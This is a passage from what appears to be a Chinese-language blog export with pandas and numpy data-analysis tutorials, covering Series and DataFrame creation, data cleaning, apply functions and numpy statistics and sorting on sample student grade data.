index=[‘a’, ‘b’, ‘c’]</h3><h3 id="创建Series的三种方式"><a href="#创建Series的三种方式" class="headerlink" title="创建Series的三种方式"></a>创建Series的三种方式</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">x1 = Series([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>])</span><br><span class="line">x2 = Series(data=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>],index=[<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>])</span><br><span class="line">dic = &#123;<span class="string">'a'</span>:<span class="number">1</span>,<span class="string">'b'</span>:<span class="number">2</span>,<span class="string">'c'</span>:<span class="number">3</span>,<span class="string">'d'</span>:<span class="number">4</span>&#125;</span><br><span class="line">x3 = Series(dic)</span><br><span class="line">print(x1)</span><br><span class="line">print(x2)</span><br><span class="line">print(x3)</span><br></pre></td></tr></table></figure><pre><code>0    11    22    33    4dtype: int64a    1b    2c    3d    4dtype: int64a    1b    2c    3d    4dtype: int64</code></pre><h3 id="DataFrame类似数据库中的表，可以将其看成是由有相同的索引的Series组成"><a href="#DataFrame类似数据库中的表，可以将其看成是由有相同的索引的Series组成" class="headerlink" title="DataFrame类似数据库中的表，可以将其看成是由有相同的索引的Series组成"></a>DataFrame类似数据库中的表，可以将其看成是由有相同的索引的Series组成</h3><h3 id="创建DataFra几种方式"><a href="#创建DataFra几种方式" class="headerlink" title="创建DataFra几种方式"></a>创建DataFra几种方式</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">data = &#123;<span class="string">"chinese"</span>:[<span class="number">90</span>,<span class="number">80</span>,<span class="number">70</span>,<span class="number">60</span>,<span class="number">50</span>],<span class="string">'math'</span>:[<span class="number">70</span>,<span class="number">80</span>,<span class="number">70</span>,<span class="number">90</span>,<span class="number">60</span>],<span class="string">'english'</span>:[<span class="number">30</span>,<span class="number">50</span>,<span class="number">70</span>,<span class="number">80</span>,<span class="number">60</span>]&#125;</span><br><span class="line">df1 = DataFrame(data=data,index=[<span class="string">'zhangfei'</span>,<span class="string">'guanyu'</span>,<span class="string">'zhaoyun'</span>,<span class="string">'huangzhong'</span>,<span class="string">'machao'</span>])</span><br><span class="line">print(df)</span><br></pre></td></tr></table></figure><pre><code>            chinese  english  mathzhangfei         90       30    70guanyu           80       50    80zhaoyun          70       70    70huangzhong       60       80    90machao           50       60    60</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> xlrd</span><br><span class="line">df2 = DataFrame(pd.read_excel(<span class="string">'datas/grades.xlsx'</span>))</span><br><span class="line">df2 = df2.drop_duplicates()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(df2)</span><br></pre></td></tr></table></figure><pre><code>     姓名   高数  英语  C++0   蒋广佳   43  69   611    廖菲   80  64   622   沈秀玲   68  74   983    韦丹   48  53   644   张梦雅   72  73   965   赵雅欣   60  63   706   曹海广   74  60   207   陈泽灿   38  21   928    邓杰   88  67   849   高海亮   86  74   9610  顾晓冬   84  60   9011  侯星宇   64  69   9612  江宜哲   60  33   7013  李洪汀   76  56   8414  梁杨杨   68  54   9415   刘辉   68  63   9816  罗嘉豪   39  44   5617  施亚君   90  63   9018   孙添   64  63   7819   王杰   74  60   7620   王泽   52  48   9421  徐孟圆   60  69   7422  杨福程   70  49   7623  尤澳晨   91  67   8624   翟佳   78  73   8825   张旭  100  60   9826  支星哲   80  63  10027  邹湘涛   54  40   90</code></pre><h2 id="数据清洗"><a href="#数据清洗" class="headerlink" title="数据清洗"></a>数据清洗</h2><h3 id="删除不必要的行或列"><a href="#删除不必要的行或列" class="headerlink" title="删除不必要的行或列"></a>删除不必要的行或列</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#删除行</span></span><br><span class="line">df2 = df2.drop(columns=[<span class="string">'姓名'</span>])</span><br><span class="line">print(df2)</span><br></pre></td></tr></table></figure><pre><code>     高数  英语  C++0    43  69   611    80  64   622    68  74   983    48  53   644    72  73   965    60  63   706    74  60   207    38  21   928    88  67   849    86  74   9610   84  60   9011   64  69   9612   60  33   7013   76  56   8414   68  54   9415   68  63   9816   39  44   5617   90  63   9018   64  63   7819   74  60   7620   52  48   9421   60  69   7422   70  49   7623   91  67   8624   78  73   8825  100  60   9826   80  63  10027   54  40   90</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#删除列</span></span><br><span class="line">df2 = df2.drop(index = [<span class="number">27</span>])</span><br><span class="line">print(df2)</span><br></pre></td></tr></table></figure><pre><code>     高数  英语  C++0    43  69   611    80  64   622    68  74   983    48  53   644    72  73   965    60  63   706    74  60   207    38  21   928    88  67   849    86  74   9610   84  60   9011   64  69   9612   60  33   7013   76  56   8414   68  54   9415   68  63   9816   39  44   5617   90  63   9018   64  63   7819   74  60   7620   52  48   9421   60  69   7422   70  49   7623   91  67   8624   78  73   8825  100  60   9826   80  63  100</code></pre><h3 id="重命名列名"><a href="#重命名列名" class="headerlink" title="重命名列名"></a>重命名列名</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df2 = df2.rename(columns=&#123;<span class="string">'高数'</span>:<span class="string">'math'</span>,<span class="string">'英语'</span>:<span class="string">'english'</span>&#125;)</span><br></pre></td></tr></table></figure><h3 id="去除重复的值"><a href="#去除重复的值" class="headerlink" title="去除重复的值"></a>去除重复的值</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df2 = df2.drop_duplicates()</span><br></pre></td></tr></table></figure><h3 id="更改数据格式"><a href="#更改数据格式" class="headerlink" title="更改数据格式"></a>更改数据格式</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">df2[<span class="string">'math'</span>] = df2[<span class="string">'math'</span>].astype(<span class="string">'str'</span>)</span><br><span class="line"><span class="comment">#df2['math'].astype(np.int64)</span></span><br></pre></td></tr></table></figure><h3 id="清除数据间的空格"><a href="#清除数据间的空格" class="headerlink" title="清除数据间的空格"></a>清除数据间的空格</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">df2[<span class="string">'math'</span>] = df2[<span class="string">'math'</span>].map(str.strip) <span class="comment">#删除左右两边的空格</span></span><br><span class="line">df2[<span class="string">'math'</span>] = df2[<span class="string">'math'</span>].map(str.lstrip) <span class="comment">#删除左边的空格（str.rstrip 右边的空格）</span></span><br></pre></td></tr></table></figure><h3 id="删除指定字符"><a href="#删除指定字符" class="headerlink" title="删除指定字符"></a>删除指定字符</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df2[<span class="string">'math'</span>] = df2[<span class="string">'math'</span>].str.strip(<span class="string">'$'</span>)</span><br></pre></td></tr></table></figure><h3 id="大小写转换"><a href="#大小写转换" class="headerlink" title="大小写转换"></a>大小写转换</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df2.columns = df2.columns.str.upper() <span class="comment">#全部大写（lower（）全部小写 title（）首字母大写）</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df2</span><br></pre></td></tr></table></figure><div><br><style scoped><br>    .dataframe tbody tr th:only-of-type {<br>        vertical-align: middle;<br>    }<br><br>    .dataframe tbody tr th {<br>        vertical-align: top;<br>    }<br><br>    .dataframe thead th {<br>        text-align: right;<br>    }<br></style><br><table border="1" class="dataframe"><br>  <thead><br>    <tr style="text-align: right;"><br>      <th></th><br>      <th>MATH</th><br>      <th>ENGLISH</th><br>      <th>C++</th><br>    </tr><br>  </thead><br>  <tbody><br>    <tr><br>      <th>0</th><br>      <td>43</td><br>      <td>69</td><br>      <td>61</td><br>    </tr><br>    <tr><br>      <th>1</th><br>      <td>80</td><br>      <td>64</td><br>      <td>62</td><br>    </tr><br>    <tr><br>      <th>2</th><br>      <td>68</td><br>      <td>74</td><br>      <td>98</td><br>    </tr><br>    <tr><br>      <th>3</th><br>      <td>48</td><br>      <td>53</td><br>      <td>64</td><br>    </tr><br>    <tr><br>      <th>4</th><br>      <td>72</td><br>      <td>73</td><br>      <td>96</td><br>    </tr><br>    <tr><br>      <th>5</th><br>      <td>60</td><br>      <td>63</td><br>      <td>70</td><br>    </tr><br>    <tr><br>      <th>6</th><br>      <td>74</td><br>      <td>60</td><br>      <td>20</td><br>    </tr><br>    <tr><br>      <th>7</th><br>      <td>38</td><br>      <td>21</td><br>      <td>92</td><br>    </tr><br>    <tr><br>      <th>8</th><br>      <td>88</td><br>      <td>67</td><br>      <td>84</td><br>    </tr><br>    <tr><br>      <th>9</th><br>      <td>86</td><br>      <td>74</td><br>      <td>96</td><br>    </tr><br>    <tr><br>      <th>10</th><br>      <td>84</td><br>      <td>60</td><br>      <td>90</td><br>    </tr><br>    <tr><br>      <th>11</th><br>      <td>64</td><br>      <td>69</td><br>      <td>96</td><br>    </tr><br>    <tr><br>      <th>12</th><br>      <td>60</td><br>      <td>33</td><br>      <td>70</td><br>    </tr><br>    <tr><br>      <th>13</th><br>      <td>76</td><br>      <td>56</td><br>      <td>84</td><br>    </tr><br>    <tr><br>      <th>14</th><br>      <td>68</td><br>      <td>54</td><br>      <td>94</td><br>    </tr><br>    <tr><br>      <th>15</th><br>      <td>68</td><br>      <td>63</td><br>      <td>98</td><br>    </tr><br>    <tr><br>      <th>16</th><br>      <td>39</td><br>      <td>44</td><br>      <td>56</td><br>    </tr><br>    <tr><br>      <th>17</th><br>      <td>90</td><br>      <td>63</td><br>      <td>90</td><br>    </tr><br>    <tr><br>      <th>18</th><br>      <td>64</td><br>      <td>63</td><br>      <td>78</td><br>    </tr><br>    <tr><br>      <th>19</th><br>      <td>74</td><br>      <td>60</td><br>      <td>76</td><br>    </tr><br>    <tr><br>      <th>20</th><br>      <td>52</td><br>      <td>48</td><br>      <td>94</td><br>    </tr><br>    <tr><br>      <th>21</th><br>      <td>60</td><br>      <td>69</td><br>      <td>74</td><br>    </tr><br>    <tr><br>      <th>22</th><br>      <td>70</td><br>      <td>49</td><br>      <td>76</td><br>    </tr><br>    <tr><br>      <th>23</th><br>      <td>91</td><br>      <td>67</td><br>      <td>86</td><br>    </tr><br>    <tr><br>      <th>24</th><br>      <td>78</td><br>      <td>73</td><br>      <td>88</td><br>    </tr><br>    <tr><br>      <th>25</th><br>      <td>100</td><br>      <td>60</td><br>      <td>98</td><br>    </tr><br>    <tr><br>      <th>26</th><br>      <td>80</td><br>      <td>63</td><br>      <td>100</td><br>    </tr><br>  </tbody><br></table><br></div><h3 id="使用apply函数对数据进行清洗"><a href="#使用apply函数对数据进行清洗" class="headerlink" title="使用apply函数对数据进行清洗"></a>使用apply函数对数据进行清洗</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#df2['MATH'] = df2['MATH'].apply(str.lower)</span></span><br><span class="line">df2[<span class="string">'MATH'</span>] = df2[<span class="string">'MATH'</span>].astype(np.int64)</span><br><span class="line">df2</span><br></pre></td></tr></table></figure><div><br><style scoped><br>    .dataframe tbody tr th:only-of-type {<br>        vertical-align: middle;<br>    }<br><br>    .dataframe tbody tr th {<br>        vertical-align: top;<br>    }<br><br>    .dataframe thead th {<br>        text-align: right;<br>    }<br></style><br><table border="1" class="dataframe"><br>  <thead><br>    <tr style="text-align: right;"><br>      <th></th><br>      <th>MATH</th><br>      <th>ENGLISH</th><br>      <th>C++</th><br>    </tr><br>  </thead><br>  <tbody><br>    <tr><br>      <th>0</th><br>      <td>43</td><br>      <td>69</td><br>      <td>61</td><br>    </tr><br>    <tr><br>      <th>1</th><br>      <td>80</td><br>      <td>64</td><br>      <td>62</td><br>    </tr><br>    <tr><br>      <th>2</th><br>      <td>68</td><br>      <td>74</td><br>      <td>98</td><br>    </tr><br>    <tr><br>      <th>3</th><br>      <td>48</td><br>      <td>53</td><br>      <td>64</td><br>    </tr><br>    <tr><br>      <th>4</th><br>      <td>72</td><br>      <td>73</td><br>      <td>96</td><br>    </tr><br>    <tr><br>      <th>5</th><br>      <td>60</td><br>      <td>63</td><br>      <td>70</td><br>    </tr><br>    <tr><br>      <th>6</th><br>      <td>74</td><br>      <td>60</td><br>      <td>20</td><br>    </tr><br>    <tr><br>      <th>7</th><br>      <td>38</td><br>      <td>21</td><br>      <td>92</td><br>    </tr><br>    <tr><br>      <th>8</th><br>      <td>88</td><br>      <td>67</td><br>      <td>84</td><br>    </tr><br>    <tr><br>      <th>9</th><br>      <td>86</td><br>      <td>74</td><br>      <td>96</td><br>    </tr><br>    <tr><br>      <th>10</th><br>      <td>84</td><br>      <td>60</td><br>      <td>90</td><br>    </tr><br>    <tr><br>      <th>11</th><br>      <td>64</td><br>      <td>69</td><br>      <td>96</td><br>    </tr><br>    <tr><br>      <th>12</th><br>      <td>60</td><br>      <td>33</td><br>      <td>70</td><br>    </tr><br>    <tr><br>      <th>13</th><br>      <td>76</td><br>      <td>56</td><br>      <td>84</td><br>    </tr><br>    <tr><br>      <th>14</th><br>      <td>68</td><br>      <td>54</td><br>      <td>94</td><br>    </tr><br>    <tr><br>      <th>15</th><br>      <td>68</td><br>      <td>63</td><br>      <td>98</td><br>    </tr><br>    <tr><br>      <th>16</th><br>      <td>39</td><br>      <td>44</td><br>      <td>56</td><br>    </tr><br>    <tr><br>      <th>17</th><br>      <td>90</td><br>      <td>63</td><br>      <td>90</td><br>    </tr><br>    <tr><br>      <th>18</th><br>      <td>64</td><br>      <td>63</td><br>      <td>78</td><br>    </tr><br>    <tr><br>      <th>19</th><br>      <td>74</td><br>      <td>60</td><br>      <td>76</td><br>    </tr><br>    <tr><br>      <th>20</th><br>      <td>52</td><br>      <td>48</td><br>      <td>94</td><br>    </tr><br>    <tr><br>      <th>21</th><br>      <td>60</td><br>      <td>69</td><br>      <td>74</td><br>    </tr><br>    <tr><br>      <th>22</th><br>      <td>70</td><br>      <td>49</td><br>      <td>76</td><br>    </tr><br>    <tr><br>      <th>23</th><br>      <td>91</td><br>      <td>67</td><br>      <td>86</td><br>    </tr><br>    <tr><br>      <th>24</th><br>      <td>78</td><br>      <td>73</td><br>      <td>88</td><br>    </tr><br>    <tr><br>      <th>25</th><br>      <td>100</td><br>      <td>60</td><br>      <td>98</td><br>    </tr><br>    <tr><br>      <th>26</th><br>      <td>80</td><br>      <td>63</td><br>      <td>100</td><br>    </tr><br>  </tbody><br></table><br></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">plus</span><span class="params">(df)</span>:</span></span><br><span class="line">    df[<span class="string">'Total'</span>] = df[<span class="string">'MATH'</span>]+df[<span class="string">'ENGLISH'</span>]+df[<span class="string">'C++'</span>]</span><br><span class="line">    <span class="keyword">return</span> df</span><br><span class="line">df2 = df2.apply(plus,axis=<span class="number">1</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(df2)</span><br></pre></td></tr></table></figure><pre><code>    MATH  ENGLISH  C++  Total0     43       69   61    1731     80       64   62    2062     68       74   98    2403     48       53   64    1654     72       73   96    2415     60       63   70    1936     74       60   20    1547     38       21   92    1518     88       67   84    2399     86       74   96    25610    84       60   90    23411    64       69   96    22912    60       33   70    16313    76       56   84    21614    68       54   94    21615    68       63   98    22916    39       44   56    13917    90       63   90    24318    64       63   78    20519    74       60   76    21020    52       48   94    19421    60       69   74    20322    70       49   76    19523    91       67   86    24424    78       73   88    23925   100       60   98    25826    80       63  100    243</code></pre><h2 id="pandas中常用的统计函数"><a href="#pandas中常用的统计函数" class="headerlink" title="pandas中常用的统计函数"></a>pandas中常用的统计函数</h2><p><img src="/2018/12/25/数据分析-pandas/1.jpg" alt="1.jpg"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(df2.describe())</span><br></pre></td></tr></table></figure><pre><code>             MATH    ENGLISH         C++       Totalcount   27.000000  27.000000   27.000000   27.000000mean    69.444444  59.703704   81.148148  210.296296std     16.113380  12.406000   17.933003   34.410212min     38.000000  21.000000   20.000000  139.00000025%     60.000000  55.000000   72.000000  193.50000050%     70.000000  63.000000   86.000000  216.00000075%     80.000000  68.000000   95.000000  239.500000max    100.000000  74.000000  100.000000  258.000000</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 数据分析 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>数据分析----numpy </title>
      <link href="/2018/12/23/%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90-numpy/"/>
      <url>/2018/12/23/%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90-numpy/</url>
      
        <content type="html"><![CDATA[<h1 id="数据分析—numpy"><a href="#数据分析—numpy" class="headerlink" title="数据分析—numpy"></a>数据分析—numpy</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br></pre></td></tr></table></figure><h2 id="创建普通数组"><a href="#创建普通数组" class="headerlink" title="创建普通数组"></a>创建普通数组</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a = np.array([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>])</span><br><span class="line">b = np.array([[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],[<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>],[<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>]])</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b[<span class="number">1</span>,<span class="number">1</span>] = <span class="number">10</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">print(a.shape)</span><br><span class="line">print(b.shape)</span><br><span class="line">print(a.dtype)</span><br><span class="line">print(b)</span><br></pre></td></tr></table></figure><pre><code>(3,)(3, 3)int64[[1 2 3] [4 5 6] [7 8 9]]</code></pre><h2 id="创建结构数组"><a href="#创建结构数组" class="headerlink" title="创建结构数组"></a>创建结构数组</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">personalType = np.dtype(&#123;</span><br><span class="line">    <span class="string">'names'</span>:[<span class="string">'name'</span>,<span class="string">'age'</span>,<span class="string">'chinese'</span>,<span class="string">'math'</span>,<span class="string">'english'</span>],</span><br><span class="line">    <span class="string">'formats'</span>:[<span class="string">'S25'</span>,<span class="string">'i'</span>,<span class="string">'i'</span>,<span class="string">'i'</span>,<span class="string">'f'</span>]</span><br><span class="line">&#125;)</span><br><span class="line">students = np.array([(<span class="string">"huzai"</span>,<span class="number">22</span>,<span class="number">99</span>,<span class="number">99</span>,<span class="number">99.5</span>),(<span class="string">"huzai"</span>,<span class="number">22</span>,<span class="number">99</span>,<span class="number">99</span>,<span class="number">99.5</span>)],dtype=personalType)</span><br><span class="line">age = students[:][<span class="string">'age'</span>]</span><br><span class="line">print(np.mean(age))</span><br></pre></td></tr></table></figure><pre><code>22.0</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(students)</span><br></pre></td></tr></table></figure><pre><code>[(b&apos;huzai&apos;, 22, 99, 99, 99.5) (b&apos;huzai&apos;, 22, 99, 99, 99.5)]</code></pre><h2 id="创建连续数组"><a href="#创建连续数组" class="headerlink" title="创建连续数组"></a>创建连续数组</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x1 = np.arange(<span class="number">1</span>,<span class="number">11</span>,<span class="number">2</span>) <span class="comment">#步长为2，从1开始的等差数组(不包括终值)</span></span><br><span class="line">x2 = np.linspace(<span class="number">1</span>,<span class="number">9</span>,<span class="number">5</span>) <span class="comment">#将1-9分成5块，结果如上</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print(x1)</span><br><span class="line">print(x2)</span><br></pre></td></tr></table></figure><pre><code>[1 3 5 7 9][1. 3. 5. 7. 9.]</code></pre><h2 id="数组间的算数运算"><a href="#数组间的算数运算" class="headerlink" title="数组间的算数运算"></a>数组间的算数运算</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">print(np.add(x1,x2))</span><br><span class="line">print(np.subtract(x1,x2))</span><br><span class="line">print(np.multiply(x1,x2))</span><br><span class="line">print(np.divide(x1,x2))</span><br></pre></td></tr></table></figure><pre><code>[ 2.  6. 10. 14. 18.][0. 0. 0. 0. 0.][ 1.  9. 25. 49. 81.][1. 1. 1. 1. 1.]</code></pre><h2 id="统计函数"><a href="#统计函数" class="headerlink" title="统计函数"></a>统计函数</h2><h3 id="数组中的最值-np-amin-amax"><a href="#数组中的最值-np-amin-amax" class="headerlink" title="数组中的最值 np.amin()  amax()"></a>数组中的最值 np.amin()  amax()</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a = np.array([[<span class="number">1</span>,<span class="number">3</span>,<span class="number">7</span>],[<span class="number">2</span>,<span class="number">5</span>,<span class="number">8</span>],[<span class="number">6</span>,<span class="number">4</span>,<span class="number">9</span>]])</span><br><span class="line">print(np.amin(a))</span><br><span class="line">print(np.amin(a,<span class="number">0</span>)) <span class="comment">#每一列的最小值</span></span><br><span class="line">print(np.amin(a,<span class="number">1</span>)) <span class="comment">#每行的最小值</span></span><br></pre></td></tr></table></figure><pre><code>1[1 3 7][1 2 4]</code></pre><h3 id="统计最大值与最小值之差-ptp"><a href="#统计最大值与最小值之差-ptp" class="headerlink" title="统计最大值与最小值之差 ptp()"></a>统计最大值与最小值之差 ptp()</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">print(np.ptp(a))</span><br><span class="line">print(np.ptp(a,<span class="number">0</span>)) <span class="comment">#每列最大值与最小值的差</span></span><br><span class="line">print(np.ptp(a,<span class="number">1</span>)) <span class="comment">#每行最大值与最小值的差</span></span><br></pre></td></tr></table></figure><pre><code>8[5 2 2][6 6 5]</code></pre><h3 id="统计数组的百分位数-percentile-a-p-axis-a-数组名-p-代表百分比-axis代表是行还是列"><a href="#统计数组的百分位数-percentile-a-p-axis-a-数组名-p-代表百分比-axis代表是行还是列" class="headerlink" title="统计数组的百分位数 percentile(a, p, axis)  a:数组名 p 代表百分比 axis代表是行还是列"></a>统计数组的百分位数 percentile(a, p, axis)  a:数组名 p 代表百分比 axis代表是行还是列</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">print(np.percentile(a,<span class="number">50</span>))</span><br><span class="line">print(np.percentile(a,<span class="number">50</span>,<span class="number">0</span>))</span><br><span class="line">print(np.percentile(a,<span class="number">50</span>,<span class="number">1</span>))</span><br></pre></td></tr></table></figure><pre><code>5.0[2. 4. 8.][3. 5. 6.]</code></pre><h3 id="统计数组中的中位数以及平均数-median-mean"><a href="#统计数组中的中位数以及平均数-median-mean" class="headerlink" title="统计数组中的中位数以及平均数 median() mean()"></a>统计数组中的中位数以及平均数 median() mean()</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">print(np.median(a))</span><br><span class="line">print(np.median(a,<span class="number">0</span>))</span><br><span class="line">print(np.median(a,<span class="number">1</span>))</span><br></pre></td></tr></table></figure><pre><code>5.0[2. 4. 8.][3. 5. 6.]</code></pre><h3 id="数组中的加权平均值-average-a-weights"><a href="#数组中的加权平均值-average-a-weights" class="headerlink" title="数组中的加权平均值 average(a,weights)"></a>数组中的加权平均值 average(a,weights)</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">b = np.array([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>])</span><br><span class="line">wts = np.array([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>])</span><br><span class="line">print(np.average(b))</span><br><span class="line">print(np.average(b,weights=wts))</span><br></pre></td></tr></table></figure><pre><code>2.53.0</code></pre><h3 id="统计数组中的标准差（std（））与方差（var（））"><a href="#统计数组中的标准差（std（））与方差（var（））" class="headerlink" title="统计数组中的标准差（std（））与方差（var（））"></a>统计数组中的标准差（std（））与方差（var（））</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print(np.std(b))</span><br><span class="line">print(np.var(b))</span><br></pre></td></tr></table></figure><pre><code>1.1180339887498951.25</code></pre><h2 id="Numpy排序"><a href="#Numpy排序" class="headerlink" title="Numpy排序"></a>Numpy排序</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">print(a)</span><br><span class="line">print(np.sort(a))</span><br><span class="line">print(np.sort(a,<span class="number">0</span>))</span><br></pre></td></tr></table></figure><pre><code>[[1 3 7] [2 5 8] [6 4 9]][[1 3 7] [2 5 8] [4 6 9]][[1 3 7] [2 4 8] [6 5 9]]</code></pre><h1 id="作业题"><a href="#作业题" class="headerlink" title="作业题"></a>作业题</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">st_type = np.dtype(&#123;</span><br><span class="line">    <span class="string">'names'</span>:[<span class="string">'name'</span>,<span class="string">'chinese'</span>,<span class="string">'english'</span>,<span class="string">'math'</span>],</span><br><span class="line">    <span class="string">'formats'</span>:[<span class="string">'S25'</span>,<span class="string">'i'</span>,<span class="string">'i'</span>,<span class="string">'i'</span>]</span><br><span class="line">&#125;)</span><br><span class="line">grades = np.array([(<span class="string">'zhangfei'</span>,<span class="number">66</span>,<span class="number">65</span>,<span class="number">30</span>),(<span class="string">'guanyu'</span>,<span class="number">95</span>,<span class="number">85</span>,<span class="number">98</span>),(<span class="string">'zhaoyun'</span>,<span class="number">93</span>,<span class="number">92</span>,<span class="number">96</span>),(<span class="string">'huangzhong'</span>,<span class="number">90</span>,<span class="number">88</span>,<span class="number">77</span>),</span><br><span class="line">                  (<span class="string">'dianwei'</span>,<span class="number">80</span>,<span class="number">90</span>,<span class="number">90</span>)],dtype=st_type)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(grades)</span><br></pre></td></tr></table></figure><pre><code>[(b&apos;zhangfei&apos;, 66, 65, 30) (b&apos;guanyu&apos;, 95, 85, 98) (b&apos;zhaoyun&apos;, 93, 92, 96) (b&apos;huangzhong&apos;, 90, 88, 77) (b&apos;dianwei&apos;, 80, 90, 90)]</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chinese = grades[:][<span class="string">'chinese'</span>] </span><br><span class="line">english = grades[:][<span class="string">'english'</span>]</span><br><span class="line">math = grades[:][<span class="string">'math'</span>]</span><br><span 